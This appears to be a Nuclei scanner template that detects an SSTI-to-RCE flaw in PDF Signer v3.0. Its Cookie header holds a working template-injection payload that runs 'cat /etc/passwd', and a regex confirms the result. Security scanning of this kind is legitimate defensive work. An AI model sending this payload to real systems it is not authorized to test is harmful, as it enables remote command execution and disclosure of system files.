id: pdf-signer-ssti-to-rce
info:
  author: madrobot
  name: PDF Signer v3.0 - SSTI to RCE via CSRF Cookie
  severity: high
requests:
- headers:
    Cookie: CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
  matchers:
  - status:
    - 200
    type: status
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/'
